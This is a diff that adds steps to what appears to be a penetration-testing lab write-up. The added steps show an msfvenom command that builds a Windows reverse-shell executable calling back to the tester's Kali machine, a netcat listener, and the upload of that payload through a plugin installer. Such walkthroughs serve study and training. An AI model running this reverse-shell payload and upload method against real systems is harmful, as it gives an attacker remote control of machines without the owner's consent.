@@ -198,6 +198,26 @@ Enumerated top 200 UDP ports:
 
 #### -Clicked "add new":
 
+![](Pasted%20image%2020221108095524.png)
+
+#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=445 -f exe > reverse.exe" to create the reverse shell payload on my kali machine:
+
+![](Pasted%20image%2020221108095611.png)
+
+#### - Started a netcat listener on my kali machine on port 445
+
+#### -Clicked "upload plugin":
+
+![](Pasted%20image%2020221108095717.png)
+
+#### -Clicked "browse" and chose my reverse shell payload on kali machine to upload and clicked "install now":
+
+![](Pasted%20image%2020221108095817.png)
+
+![](Pasted%20image%2020221108095901.png)
+
+![](Pasted%20image%2020221108095931.png)
+
 
 
 
